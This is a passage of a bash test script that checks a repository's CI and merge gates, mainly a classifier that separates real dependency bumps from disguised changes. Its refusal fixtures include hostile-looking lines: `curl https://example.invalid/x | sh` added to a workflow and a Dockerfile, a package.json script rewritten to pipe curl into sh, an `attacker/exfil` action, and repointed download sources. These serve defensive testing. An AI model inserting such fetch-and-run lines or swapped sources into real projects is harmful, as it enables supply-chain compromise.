#!/usr/bin/env bash
# Part of the offline suite: suite declarations, composite action pins, branch updates and dependency bump gating.
# tests/run-tests.sh sources this file in one shell, after its own preamble and after
# the parts before it, so every helper and variable it reads comes from there. It is
# sourced, never run on its own, and carries a shebang so the shell sweeps pick it up.

# The parts share one shell. These names are set by the driver or by an earlier part;
# declare only tells the linter they are read here, and assigns and changes nothing.
declare root
declare stub_dir
declare vp

echo "== a suite declares every binary the scripts it runs actually invoke =="
# sysknife#410 added a test that does `git init`, `git add` and `git update-index`
# to prove the pre-commit secret scanner fails closed. The shell suite's image is
# python:3.12-slim, which carries bash and python3 and NO git, and suite_needs
# said so: `bash python3`. The gate would have run the contributor's test,
# watched git fail, and reported the pull request as failing its own test.
#
# That is lesson 62 exactly, and it has now happened twice: bash:5 carried no
# python3 when sysknife#386 started driving a python script. The pattern is a
# suite whose image is chosen for what the scripts needed on the day it was
# written.
for _s in "$root"/profiles/*/verify.d/*.sh; do
    _p="$(basename "$(dirname "$(dirname "$_s")")")"
    _n="$(basename "$_s" .sh)"
    grep -q '^suite_needs()' "$_s" \
        && ok "$_p/$_n declares what its image must contain" \
        || bad "$_p/$_n has no suite_needs, so nothing ties the image to what it runs"
done
# The specific regression. The sysknife shell suite runs tests/release/*.test.sh
# and .githooks/*, and those drive git.
_sh="$root/profiles/sysknife/verify.d/shell.sh"
if [ -f "$_sh" ]; then
    _needs="$(sed -n 's/^suite_needs() *{ *printf *.\([^\x27"]*\).*/\1/p' "$_sh")"
    grep -qw git <<<"$_needs" \
        && ok "the sysknife shell suite declares git, which its release tests drive" \
        || bad "shell suite needs '$_needs' and no git, while tests/release drive git"
    _img="$(sed -n 's/^suite_image() *{ *printf *.\([^\x27"]*\).*/\1/p' "$_sh")"
    grep -q 'slim' <<<"$_img" \
        && bad "the shell suite image is $_img, and every -slim python image ships without git" \
        || ok "the shell suite image is not a -slim variant that drops git"
fi

# The specific one that cost the two runs.
if [ -f "$_sh" ]; then
    _needs="$(sed -n 's/^suite_needs() *{ *printf *.\([^\x27"]*\).*/\1/p' "$_sh")"
    grep -qw yamllint <<<"$_needs" \
        && ok "the sysknife shell suite declares yamllint, which its release tests drive" \
        || bad "shell suite needs '$_needs' and no yamllint, while tests/release lint YAML"
fi

echo "== the pin verifier sees composite actions, not only workflows =="
# sysknife#471 closed exactly this hole in sysknife's own gates: a `uses:` inside
# a local composite action under .github/actions/ was linted by nothing, so an
# unpinned reference could ride in through a file the scan never opened. This
# repository's verifier had the same blind spot, and the comment at the top of
# the script claims it covers "every `uses:` in .github/workflows" while the
# supply chain is wider than that directory.
vpc="$stub_dir/pincomposite"; rm -rf "$vpc"
mkdir -p "$vpc/.github/workflows" "$vpc/.github/actions/setup"
printf 'jobs:\n  a:\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1\n' \
    > "$vpc/.github/workflows/x.yml"
printf 'runs:\n  using: composite\n  steps:\n    - uses: actions/setup-node@v6\n' \
    > "$vpc/.github/actions/setup/action.yml"
out="$(bash "$vp" "$vpc" 2>&1)"; rc=$?
if [ "$rc" != 0 ] && grep -q 'actions/setup-node@v6' <<<"$out"; then
    ok "an unpinned uses: inside a composite action fails the verifier"
else
    bad "a composite action hid a floating tag from the pin check (rc=$rc)"
fi
# A directory that exists and holds no action metadata is a scan that read
# nothing, and a scan that read nothing must not print an all-clear.
rm -f "$vpc/.github/actions/setup/action.yml"
out="$(bash "$vp" "$vpc" 2>&1)"; rc=$?
[ "$rc" != 0 ] \
    && ok "an empty .github/actions directory is refused, not skipped" \
    || bad "an actions directory with nothing in it passed as clean"
# Absent is different from empty: a repository with no composite actions is
# normal and must still pass.
rm -rf "$vpc/.github/actions"
make_stub gh "case \"\$*\" in
  *git/ref/tags*object.type*) echo commit ;;
  *git/ref/tags*object.sha*) echo 3d3c42e5aac5ba805825da76410c181273ba90b1 ;;
  *) echo '' ;;
esac"
out="$(PATH="$stub_dir:$PATH" bash "$vp" "$vpc" 2>&1)"; rc=$?
[ "$rc" = 0 ] \
    && ok "a repository with no composite actions still passes" \
    || bad "the absent-directory case was turned into a failure: $(tr -d '\n' <<<"$out" | cut -c1-120)"
# And no workflow files at all is the same vacuous-scan shape.
rm -f "$vpc/.github/workflows/x.yml"
out="$(PATH="$stub_dir:$PATH" bash "$vp" "$vpc" 2>&1)"; rc=$?
[ "$rc" != 0 ] \
    && ok "a workflows directory with no workflow in it is refused" \
    || bad "the verifier printed an all-clear over an empty workflow set"
rm -f "$stub_dir/gh"

echo "== updating a branch from main is not a change to the pull request =="
# `git diff verified_head..new_head` is the two-dot trap: after GitHub's "Update
# branch" the range holds everything MAIN gained, so the gate reported main's own
# merged commits as "production code changed since the verified head" and refused
# a pull request whose own patch had not moved. sysknife requires an up-to-date
# branch before merging, so every merge hit this, and the way around it was
# `gh pr merge --admin`, which skips the receipt entirely. A gate that a required
# step invalidates is a gate people learn to bypass.
#
# What the receipt claims is about the pull request's contribution, so that is
# what has to be compared: the merge of the verified head with today's main,
# against the tree being merged. Identical means the author changed nothing,
# including inside a conflict resolution, which is the part comparing commits
# would miss.
mt="$stub_dir/mergetree"; rm -rf "$mt"; mkdir -p "$mt"
up="$mt/up"
git init -q -b main "$up"
git -C "$up" config user.email t@t; git -C "$up" config user.name t
mkdir -p "$up/crates/x/src" "$up/crates/y/src"
printf 'fn one() {}\n' > "$up/crates/x/src/lib.rs"
printf 'fn two() {}\n' > "$up/crates/y/src/lib.rs"
git -C "$up" add -A >/dev/null; git -C "$up" commit -qm base
git -C "$up" checkout -q -b pr
printf 'fn one() { work() }\n' > "$up/crates/x/src/lib.rs"
git -C "$up" add -A >/dev/null; git -C "$up" commit -qm "the pull request"
pr_old="$(git -C "$up" rev-parse HEAD)"
git -C "$up" checkout -q main
printf 'fn two() { something_else() }\n' > "$up/crates/y/src/lib.rs"
git -C "$up" add -A >/dev/null; git -C "$up" commit -qm "main moved"
git -C "$up" checkout -q pr
git -C "$up" merge -q --no-edit main >/dev/null 2>&1
pr_new="$(git -C "$up" rev-parse HEAD)"
git -C "$up" update-ref refs/pull/9/head "$pr_new"
git -C "$up" checkout -q main
mt_repo="$mt/repo"; git clone -q "$up" "$mt_repo"
mt_state="$mt/state"; mkdir -p "$mt_state"
make_stub gh "case \"\$*\" in
  *'auth switch'*) exit 0 ;;
  *'api user'*) echo testuser ;;
  *headRefOid*) echo $pr_new ;;
  *mergeStateStatus*) echo CLEAN ;;
  *reviewDecision*) echo APPROVED ;;
  *'json files'*) echo crates/x/src/lib.rs ;;
  *closingIssuesReferences*) echo '' ;;
  *'json author'*) echo someone ;;
  *'pr checks'*) echo '[{\"name\":\"rust\",\"bucket\":\"pass\"}]' ;;
  *) echo '' ;;
esac"
mt_merge() {
    PATH="$stub_dir:$PATH" MAINTAINER_STATE="$mt_state" MAINTAINER_ACCOUNT=testuser \
        MAINTAINER_SLUG=o/r MAINTAINER_REPO="$mt_repo" MAINTAINER_POST=off \
        PROD_GLOBS="crates/*/src/*" \
        bash "$root/bin/maintainer-merge" "$@" 2>&1
}
mt_merge receipt 9 "$pr_old" "guard mutated, went red" >/dev/null 2>&1
mout="$(mt_merge merge 9)"; mrc=$?
if [ "$mrc" = 0 ]; then
    ok "a branch updated from main still spends its receipt"
else
    bad "the gate read main's own commits as the pull request changing (rc=$mrc): $(tr -d '\n' <<<"$mout" | cut -c1-160)"
fi
# The other direction, which is the whole point of the check: the author pushes
# production code after the receipt was earned, and the merge must refuse.
git -C "$up" checkout -q pr
printf 'fn one() { work(); and_more() }\n' > "$up/crates/x/src/lib.rs"
git -C "$up" add -A >/dev/null; git -C "$up" commit -qm "more work"
pr_newer="$(git -C "$up" rev-parse HEAD)"
git -C "$up" update-ref refs/pull/9/head "$pr_newer"
git -C "$up" checkout -q main
make_stub gh "case \"\$*\" in
  *'auth switch'*) exit 0 ;;
  *'api user'*) echo testuser ;;
  *headRefOid*) echo $pr_newer ;;
  *mergeStateStatus*) echo CLEAN ;;
  *reviewDecision*) echo APPROVED ;;
  *'json files'*) echo crates/x/src/lib.rs ;;
  *closingIssuesReferences*) echo '' ;;
  *'json author'*) echo someone ;;
  *'pr checks'*) echo '[{\"name\":\"rust\",\"bucket\":\"pass\"}]' ;;
  *) echo '' ;;
esac"
mout="$(mt_merge merge 9)"; mrc=$?
if [ "$mrc" != 0 ] && grep -q 'production code changed' <<<"$mout"; then
    ok "a push of production code after the receipt still refuses"
else
    bad "the gate merged production code the receipt never covered (rc=$mrc)"
fi
rm -f "$stub_dir/gh"

echo "== a pure dependency bump is gated, not waved through =="
# A lockfile bump has no guard to mutate, so `verify` can never write a receipt
# for one and `merge` refuses every dependabot pull request. On 2026-09-23 that
# sent sysknife#492 and #495 around the gate with `gh pr merge --admin`, which is
# the one path this tool exists to remove. The class does have a provable claim,
# it is just a different one: nothing but dependency metadata changed, no new
# download source appeared, and every action pin is the tag its comment names.
cdb="$root/scripts/classify_dependency_bump.py"
[ -f "$cdb" ] && ok "the dependency-bump classifier exists" \
    || bad "no scripts/classify_dependency_bump.py"
dep_case() {  # $1 = patch on stdin file, prints verdict json
    python3 "$cdb" < "$1" 2>&1
}
dp="$stub_dir/dep"; mkdir -p "$dp"

cat > "$dp/lock.patch" <<'PATCH'
diff --git a/Cargo.lock b/Cargo.lock
index 5d61b394..30a412b8 100644
--- a/Cargo.lock
+++ b/Cargo.lock
@@ -126,9 +126,9 @@ dependencies = [
 [[package]]
 name = "async-openai"
-version = "0.41.3"
+version = "0.42.0"
 source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "d72db2750faea2ca5edbf6d0c50277a89dc8f75f5e6ddd695ef30f75e335019b"
+checksum = "3540b785fcd10be9458fdd8db9a63ea5bcd4b191ef557eaf2730fe0c5881c3e8"
 dependencies = [
PATCH
vout="$(dep_case "$dp/lock.patch")"
grep -q '"verdict": "dependency-bump"' <<<"$vout" \
    && ok "a version+checksum lockfile bump classifies as a dependency bump" \
    || bad "a plain Cargo.lock bump was not recognised: $(tr -d '\n' <<<"$vout" | cut -c1-120)"

cat > "$dp/git-source.patch" <<'PATCH'
diff --git a/Cargo.lock b/Cargo.lock
--- a/Cargo.lock
+++ b/Cargo.lock
@@ -126,7 +126,7 @@
 name = "async-openai"
-version = "0.41.3"
+version = "0.42.0"
-source = "registry+https://github.com/rust-lang/crates.io-index"
+source = "git+https://example.invalid/async-openai?rev=deadbeef"
PATCH
vout="$(dep_case "$dp/git-source.patch")"
grep -q '"verdict": "refused"' <<<"$vout" && grep -qi 'source' <<<"$vout" \
    && ok "a lockfile that repoints a crate at a git source is refused" \
    || bad "a non-crates.io source passed the classifier"

cat > "$dp/code.patch" <<'PATCH'
diff --git a/crates/x/src/lib.rs b/crates/x/src/lib.rs
--- a/crates/x/src/lib.rs
+++ b/crates/x/src/lib.rs
@@ -1,1 +1,1 @@
-fn a() {}
+fn a() { unsafe { std::ptr::null_mut::<u8>().write(0) } }
PATCH
vout="$(dep_case "$dp/code.patch")"
grep -q '"verdict": "refused"' <<<"$vout" \
    && ok "a diff carrying source code is not a dependency bump" \
    || bad "the classifier accepted a .rs change as a dependency bump"

cat > "$dp/pin.patch" <<'PATCH'
diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -299,7 +299,7 @@ jobs:
       - name: Install cargo-nextest
-        uses: taiki-e/install-action@fa23953489c080190314742a9b907f8e97c6767c  # v2.87.10
+        uses: taiki-e/install-action@76c2e6406e52637deed7160d77bded76bd83e06e  # v2.87.14
PATCH
vout="$(dep_case "$dp/pin.patch")"
grep -q '"verdict": "dependency-bump"' <<<"$vout" \
    && grep -q '76c2e6406e52637deed7160d77bded76bd83e06e' <<<"$vout" \
    && grep -q 'v2.87.14' <<<"$vout" \
    && ok "an action pin bump is a dependency bump and reports the pin to verify" \
    || bad "the pin bump was not reported for tag verification: $(tr -d '\n' <<<"$vout" | cut -c1-140)"

# A pin that deliberately tracks a branch carries `# stable (branch)`, which is
# not a tag, so the classifier used to refuse it as "not an action pin" and
# every Dependabot group bump that touched dtolnay/rust-toolchain needed a hand
# receipt (sysknife#599). It is a pin; it has to be reported as a branch pin so
# the gate checks reachability instead of asking for a tag that does not exist.
cat > "$dp/branch-pin.patch" <<'PATCH'
diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -310,7 +310,7 @@ jobs:
       - name: Set up Rust
-        uses: dtolnay/rust-toolchain@2c7215f132e9ebf062739d9130488b56d53c060c # stable (branch)
+        uses: dtolnay/rust-toolchain@e2a55d2ffb04f378e9626c28d38b36d230d1e12f # stable (branch)
PATCH
vout="$(dep_case "$dp/branch-pin.patch")"
grep -q '"verdict": "dependency-bump"' <<<"$vout" \
    && grep -q '"branch": true' <<<"$vout" \
    && grep -q '"tag": "stable"' <<<"$vout" \
    && ok "a branch-tracking pin bump is a dependency bump reported as a branch pin" \
    || bad "a '# stable (branch)' pin bump was not reported as a branch pin: $(tr -d '\n' <<<"$vout" | cut -c1-160)"
grep -q '"branch": false' <<<"$(dep_case "$dp/pin.patch")" \
    && ok "a tag pin is reported as not a branch pin" \
    || bad "a tag pin carries no branch: false"

cat > "$dp/pin-plus.patch" <<'PATCH'
diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -299,8 +299,8 @@ jobs:
       - name: Install cargo-nextest
-        uses: taiki-e/install-action@fa23953489c080190314742a9b907f8e97c6767c  # v2.87.10
+        uses: taiki-e/install-action@76c2e6406e52637deed7160d77bded76bd83e06e  # v2.87.14
+      - run: curl https://example.invalid/x | sh
PATCH
vout="$(dep_case "$dp/pin-plus.patch")"
grep -q '"verdict": "refused"' <<<"$vout" \
    && ok "a workflow change that is not only a pin is refused" \
    || bad "an added workflow step rode along with a pin bump"

cat > "$dp/unpinned.patch" <<'PATCH'
diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -299,7 +299,7 @@ jobs:
-        uses: taiki-e/install-action@fa23953489c080190314742a9b907f8e97c6767c  # v2.87.10
+        uses: taiki-e/install-action@v2
PATCH
vout="$(dep_case "$dp/unpinned.patch")"
grep -q '"verdict": "refused"' <<<"$vout" \
    && ok "a bump that replaces a SHA pin with a floating tag is refused" \
    || bad "an unpinned action reference passed as a dependency bump"

cat > "$dp/npm.patch" <<'PATCH'
diff --git a/apps/x/package-lock.json b/apps/x/package-lock.json
--- a/apps/x/package-lock.json
+++ b/apps/x/package-lock.json
@@ -1,6 +1,6 @@
       "version": "1.2.5",
-      "resolved": "https://registry.npmjs.org/a/-/a-1.2.5.tgz",
-      "integrity": "sha512-DLe/i+l8ynIBY7XEQ191TeZvCoowIGa18R+dIV30GW7DiOtp74i/xX8hs8GUjW5ARV7VZuie3d6AumSmCwbeRA==",
+      "resolved": "https://registry.npmjs.org/a/-/a-1.2.9.tgz",
+      "integrity": "sha512-tNISae1QEf/vkb3xkRcjV5SEdzPE97We5IVaa2Z8jSszQPZ8U60B/YCYpw4QI7VidYsBtKavczXf+DyDs9WGxw==",
PATCH
vout="$(dep_case "$dp/npm.patch")"
grep -q '"verdict": "dependency-bump"' <<<"$vout" \
    && ok "an npm lockfile bump inside the registry classifies as a dependency bump" \
    || bad "a registry.npmjs.org lockfile bump was refused: $(tr -d '\n' <<<"$vout" | cut -c1-120)"

cat > "$dp/npm-offsite.patch" <<'PATCH'
diff --git a/apps/x/package-lock.json b/apps/x/package-lock.json
--- a/apps/x/package-lock.json
+++ b/apps/x/package-lock.json
@@ -1,4 +1,4 @@
-      "resolved": "https://registry.npmjs.org/a/-/a-1.2.5.tgz",
+      "resolved": "https://cdn.example.invalid/a/-/a-1.2.9.tgz",
PATCH
vout="$(dep_case "$dp/npm-offsite.patch")"
grep -q '"verdict": "refused"' <<<"$vout" \
    && ok "an npm tarball pulled from outside the registry is refused" \
    || bad "a lockfile pointing at another host passed"

cat > "$dp/npm-install-script.patch" <<'PATCH'
diff --git a/apps/x/package-lock.json b/apps/x/package-lock.json
--- a/apps/x/package-lock.json
+++ b/apps/x/package-lock.json
@@ -1,4 +1,5 @@
       "version": "1.2.9",
+      "hasInstallScript": true,
PATCH
vout="$(dep_case "$dp/npm-install-script.patch")"
grep -q '"verdict": "refused"' <<<"$vout" \
    && ok "a bump that newly runs an install script goes to a human" \
    || bad "a package gaining an install script was waved through"

# Dockerfile base images. sysknife pins its build images by manifest-list digest
# so a moved tag cannot change the build, and Dependabot's docker ecosystem
# bumps them. The classifier had no arm for that path, so every such bump was
# refused as "not dependency metadata" and went to a human, which is how
# sysknife#534 and #535 came to be waiting on an asserted receipt.
cat > "$dp/docker.patch" <<'PATCH'
diff --git a/Dockerfile b/Dockerfile
--- a/Dockerfile
+++ b/Dockerfile
@@ -6,7 +6,7 @@
-FROM docker.io/library/rust:1-bookworm@sha256:9a73a5088750b4c95158ab26629c854c3d6fc4b173cb7bc8079ad252d8ed7bfa AS builder
+FROM docker.io/library/rust:1-bookworm@sha256:93ce27a88655056a51dbdd8f5f2d7ddc071c7b0070fb288a37b5a285fc83971e AS builder
PATCH
vout="$(dep_case "$dp/docker.patch")"
grep -q '"verdict": "dependency-bump"' <<<"$vout" \
    && grep -q '93ce27a88655056a51dbdd8f5f2d7ddc071c7b0070fb288a37b5a285fc83971e' <<<"$vout" \
    && grep -q '"tag": "1-bookworm"' <<<"$vout" \
    && ok "a base-image digest bump is a dependency bump and reports the image to verify" \
    || bad "the Dockerfile digest bump was not reported for verification: $(tr -d '\n' <<<"$vout" | cut -c1-160)"

# A digest bump keeps the tag and moves only the digest, and the verdict says so,
# because `maintainer deps` lets that shape through with no semver class to read.
grep -q '"same_tag": true' <<<"$(dep_case "$dp/docker.patch")" \
    && ok "a digest-only base image bump is reported as keeping its tag" \
    || bad "the verdict does not say the docker.patch bump kept its tag"
cat > "$dp/docker-retag.patch" <<'PATCH'
diff --git a/Dockerfile b/Dockerfile
--- a/Dockerfile
+++ b/Dockerfile
@@ -6,7 +6,7 @@
-FROM docker.io/library/rust:1-bookworm@sha256:9a73a5088750b4c95158ab26629c854c3d6fc4b173cb7bc8079ad252d8ed7bfa AS builder
+FROM docker.io/library/rust:1-trixie@sha256:93ce27a88655056a51dbdd8f5f2d7ddc071c7b0070fb288a37b5a285fc83971e AS builder
PATCH
vout="$(dep_case "$dp/docker-retag.patch")"
grep -q '"verdict": "dependency-bump"' <<<"$vout" && grep -q '"same_tag": false' <<<"$vout" \
    && ok "a base image that changes tag is reported as not keeping it" \
    || bad "a retagged base image was not reported as same_tag false: $(tr -d '\n' <<<"$vout" | cut -c1-160)"

# The pin is the whole control. A bump that leaves the image on a bare tag has
# given up the property the digest was there for, whatever Dependabot titled it.
cat > "$dp/docker-unpinned.patch" <<'PATCH'
diff --git a/Dockerfile b/Dockerfile
--- a/Dockerfile
+++ b/Dockerfile
@@ -6,7 +6,7 @@
-FROM docker.io/library/rust:1-bookworm@sha256:9a73a5088750b4c95158ab26629c854c3d6fc4b173cb7bc8079ad252d8ed7bfa AS builder
+FROM docker.io/library/rust:1-bookworm AS builder
PATCH
vout="$(dep_case "$dp/docker-unpinned.patch")"
grep -q '"verdict": "refused"' <<<"$vout" \
    && grep -q 'pinned by digest' <<<"$vout" \
    && ok "a base image that stops being pinned by digest is refused" \
    || bad "a Dockerfile dropping its digest pin passed as a dependency bump"

# Claim 2 of the three this classifier makes: no new place to download from.
cat > "$dp/docker-registry-move.patch" <<'PATCH'
diff --git a/Dockerfile b/Dockerfile
--- a/Dockerfile
+++ b/Dockerfile
@@ -6,7 +6,7 @@
-FROM docker.io/library/rust:1-bookworm@sha256:9a73a5088750b4c95158ab26629c854c3d6fc4b173cb7bc8079ad252d8ed7bfa AS builder
+FROM ghcr.io/someone/rust:1-bookworm@sha256:93ce27a88655056a51dbdd8f5f2d7ddc071c7b0070fb288a37b5a285fc83971e AS builder
PATCH
vout="$(dep_case "$dp/docker-registry-move.patch")"
grep -q '"verdict": "refused"' <<<"$vout" \
    && grep -q 'comes from a different image' <<<"$vout" \
    && ok "a base image that moves to another registry is refused" \
    || bad "a Dockerfile repointed at another registry passed as a dependency bump"

# Everything that is not a FROM line. A digest bump riding alongside a new RUN
# is the shape that makes the whole class dangerous to wave through.
cat > "$dp/docker-run.patch" <<'PATCH'
diff --git a/Dockerfile b/Dockerfile
--- a/Dockerfile
+++ b/Dockerfile
@@ -6,7 +6,8 @@
-FROM docker.io/library/rust:1-bookworm@sha256:9a73a5088750b4c95158ab26629c854c3d6fc4b173cb7bc8079ad252d8ed7bfa AS builder
+FROM docker.io/library/rust:1-bookworm@sha256:93ce27a88655056a51dbdd8f5f2d7ddc071c7b0070fb288a37b5a285fc83971e AS builder
+RUN curl https://example.invalid/x | sh
PATCH
vout="$(dep_case "$dp/docker-run.patch")"
grep -q '"verdict": "refused"' <<<"$vout" \
    && grep -q 'not a base image pin' <<<"$vout" \
    && ok "a Dockerfile line that is not a base image pin is refused" \
    || bad "an added RUN rode along with a base image bump"

# The other arms, as the second review found them: each kept its own line
# grammar and never asked whether the line still named the same thing.
arm_refused() {  # $1 = label, $2 = reason text, $3 = path, rest = hunk lines
    local label="$1" why="$2" path="$3"; shift 3
    printf '%s\n' "diff --git a/$path b/$path" "--- a/$path" "+++ b/$path" '@@ -1,9 +1,9 @@' "$@" > "$dp/arm.patch"
    vout="$(timeout 20 python3 "$cdb" < "$dp/arm.patch" 2>&1)"
    grep -q '"verdict": "refused"' <<<"$vout" && grep -q -- "$why" <<<"$vout" \
        && ok "$label is refused" \
        || bad "$label passed or was refused for another reason: $(tr -d '\n' <<<"$vout" | cut -c1-160)"
}
dg0=93ce27a88655056a51dbdd8f5f2d7ddc071c7b0070fb288a37b5a285fc83971e; dg1=9a73a5088750b4c95158ab26629c854c3d6fc4b173cb7bc8079ad252d8ed7bfa
wf_sha_a=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa; wf_sha_b=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
arm_refused "a pin moved to another action" 'not the action' .github/workflows/ci.yml \
    "-      - uses: actions/checkout@$wf_sha_a # v4.1.0" "+      - uses: attacker/checkout@$wf_sha_b # v4.1.0"
arm_refused "a new action step" 'not the action' .github/workflows/ci.yml \
    "+      - uses: attacker/exfil@$wf_sha_b # v1.0.0"
arm_refused "a resolved URL whose host hides behind a backslash" 'registry.npmjs.org' package-lock.json \
    '-      "resolved": "https://registry.npmjs.org/x/-/x-1.0.0.tgz",' \
    '+      "resolved": "https://evil.example\\@registry.npmjs.org/x/-/x-1.0.1.tgz",'
for spec in 'https://evil.example/left-pad-1.0.0.tgz' 'github:attacker/left-pad#main' 'npm:evil-left-pad@^1.0.0'; do
    arm_refused "a package.json range replaced by $spec" 'set to a version range' package.json \
        '-    "left-pad": "^1.0.0"' "+    \"left-pad\": \"$spec\""
done
arm_refused "a package.json line that is not a dependency" 'set to a version range' package.json \
    '+  "main": "./evil.js",'
arm_refused "a package.json script rewritten under the same key" 'not a dependency set to a version range' package.json \
    '-    "test": "jest",' '+    "test": "curl x | sh",'
arm_refused "a new package.json dependency" 'already had' package.json \
    '+    "evil-dep": "1.0.0",'
arm_refused "a package.json range moved to a dist-tag" 'not a dependency set to a version range' package.json \
    '-    "left-pad": "^1.0.0"' '+    "left-pad": "evil"'
arm_refused "a Cargo.toml git source moved" 'not a version' Cargo.toml \
    '-foo = { git = "https://github.com/good/foo", tag = "v1.0.0" }' \
    '+foo = { git = "https://evil.example/foo", tag = "v1.0.0" }'
arm_refused "a Cargo.toml package rename" 'not a version' Cargo.toml \
    '-bar = { version = "1.0", package = "bar" }' '+bar = { version = "1.0", package = "evil-bar" }'
arm_refused "a Dockerfile stage renamed and a stage added" 'stage' Dockerfile \
    "-FROM python:3.12@sha256:$dg0 AS build" "+FROM python:3.12@sha256:$dg1 AS final" \
    "+FROM python:3.12@sha256:$dg1 AS extra"
# And the ordinary bump in each arm still passes.
arm_bump() {  # $1 = label, $2 = path, rest = hunk lines
    local label="$1" path="$2"; shift 2
    printf '%s\n' "diff --git a/$path b/$path" "--- a/$path" "+++ b/$path" '@@ -1,9 +1,9 @@' "$@" > "$dp/arm.patch"
    vout="$(timeout 20 python3 "$cdb" < "$dp/arm.patch" 2>&1)"
    grep -q '"verdict": "dependency-bump"' <<<"$vout" && ok "$label still classifies as a bump" \
        || bad "$label is now refused: $(tr -d '\n' <<<"$vout" | cut -c1-160)"
}
arm_bump "a package.json range bump" package.json '-    "left-pad": "^1.0.0",' '+    "left-pad": "^1.3.0",'
arm_bump "a package.json OR range with a prerelease" package.json '-    "x": ">=1.0.0 || 2.0.0-beta.1",' '+    "x": ">=1.2.0 || 2.0.0-beta.2",'
arm_bump "a Cargo.toml version bump" Cargo.toml '-serde = { version = "1.0.200", features = ["derive"] }' '+serde = { version = "1.0.210", features = ["derive"] }'
arm_bump "a Dockerfile digest bump in a named stage" Dockerfile "-FROM python:3.12@sha256:$dg0 AS build" "+FROM python:3.12@sha256:$dg1 AS build"

# pip, as Dependabot writes it for a hash-pinned requirements file. sysknife
# added a pip ecosystem for tools/ci-python on 2026-10-29, and its first bump
# (sysknife#735, PyYAML 6.0.2 -> 6.0.3) was refused as "not dependency
# metadata". The file is a lockfile in all but name: every package pinned with
# `==` and every artifact named by its sha256, installed with --require-hashes.
cat > "$dp/pip.patch" <<'PATCH'
diff --git a/tools/ci-python/requirements.txt b/tools/ci-python/requirements.txt
index e0b9b360..215aaf42 100644
--- a/tools/ci-python/requirements.txt
+++ b/tools/ci-python/requirements.txt
@@ -18,8 +18,8 @@
 pathspec==1.1.1 \
     --hash=sha256:17db5ecd524104a120e173814c90367a96a98d07c45b2e10c2f3919fff91bf5a \
     --hash=sha256:a00ce642f577bf7f473932318056212bc4f8bfdf53128c78bbd5af0b9b20b189
-PyYAML==6.0.2 \
-    --hash=sha256:01179a4a8559ab5de078078f37e5c1a30d76bb88519906844fd7bdea1b7729ff \
-    --hash=sha256:0833f8694549e586547b576dcfaba4a6b55b9e96098b36cdc7ebefe667dfed48
+PyYAML==6.0.3 \
+    --hash=sha256:00c4bdeba853cc34e7dd471f16b4114f4162dc03e6b7afcc2128711f0eca823c \
+    --hash=sha256:0150219816b6a1fa26fb4699fb7daa9caf09eb1999f3b70fb6e786805e80375a
 yamllint==1.38.0 \
PATCH
vout="$(dep_case "$dp/pip.patch")"
grep -q '"verdict": "dependency-bump"' <<<"$vout" \
    && grep -q '"pip-requirements"' <<<"$vout" \
    && grep -q '"name": "PyYAML"' <<<"$vout" && grep -q '"version": "6.0.3"' <<<"$vout" \
    && grep -q '0150219816b6a1fa26fb4699fb7daa9caf09eb1999f3b70fb6e786805e80375a' <<<"$vout" \
    && ok "a hash-pinned pip bump is a dependency bump and reports the package and hashes to verify" \
    || bad "the pip bump was not reported for verification: $(tr -d '\n' <<<"$vout" | cut -c1-160)"

# A requirements file can name where to download from, and any of these lines
# is a new place to download from. The grammar is an allowlist (a pin, a hash,
# a comment), so each one is refused without being listed.
pip_refused() {  # $1 = name, $2 = the reason the verdict must give, $3 = the changed lines
    printf '%s\n' 'diff --git a/requirements.txt b/requirements.txt' \
        '--- a/requirements.txt' '+++ b/requirements.txt' '@@ -1,3 +1,3 @@' "$3" > "$dp/pip-$1.patch"
    vout="$(dep_case "$dp/pip-$1.patch")"
    grep -q '"verdict": "refused"' <<<"$vout" && grep -q "$2" <<<"$vout" \
        && ok "a pip bump that $1 is refused" \
        || bad "a pip bump that $1 passed: $(tr -d '\n' <<<"$vout" | cut -c1-160)"
}
h1=00c4bdeba853cc34e7dd471f16b4114f4162dc03e6b7afcc2128711f0eca823c
h0=01179a4a8559ab5de078078f37e5c1a30d76bb88519906844fd7bdea1b7729ff
pip_refused "adds an extra index" 'not a pinned requirement' \
    "+--extra-index-url https://example.invalid/simple"
pip_refused "drops a private index" 'not a pinned requirement' \
    "---index-url https://pypi.internal.invalid/simple"
pip_refused "installs from a URL" 'not a pinned requirement' \
    "-PyYAML==6.0.2 \\
-    --hash=sha256:$h0
+PyYAML @ https://example.invalid/PyYAML-6.0.3.tar.gz"
pip_refused "installs an editable checkout" 'not a pinned requirement' "+-e git+https://example.invalid/pyyaml#egg=PyYAML"
pip_refused "drops the hashes" 'drops hash pinning' \
    "-PyYAML==6.0.2 \\
-    --hash=sha256:$h0
+PyYAML==6.0.3"
pip_refused "swaps a hash under an unchanged pin" 'without the requirement' \
    "-    --hash=sha256:$h0
+    --hash=sha256:$h1"
pip_refused "loosens the pin to a range" 'not a pinned requirement' \
    "-PyYAML==6.0.2 \\
-    --hash=sha256:$h0
+PyYAML>=6.0.2 \\
+    --hash=sha256:$h1"
# pip joins a requirement and its hashes into one logical line at each trailing
# backslash. A hash after a line that does not continue belongs to no
# requirement, so there is no release to check it against.
pip_refused "puts a hash under a requirement that does not continue" 'without the requirement' \
    "-PyYAML==6.0.2 \\
-    --hash=sha256:$h0
+PyYAML==6.0.3
+    --hash=sha256:$h1"
pip_refused "adds a hash after the last one of its requirement" 'without the requirement' \
    "-PyYAML==6.0.2 \\
-    --hash=sha256:$h0
+PyYAML==6.0.3 \\
+    --hash=sha256:$h1
+    --hash=sha256:$h0"
# pip splits a requirement line on spaces and reads everything from the first
# token that starts with `-` as per-requirement options, quotes or not
# (req_file.break_args_options). The marker's character set allows `-`, `=` and
# quotes, so an option could ride in the marker slot and pass as a pin.
pip_refused "hides a build option behind a marker" 'carries a pip option' \
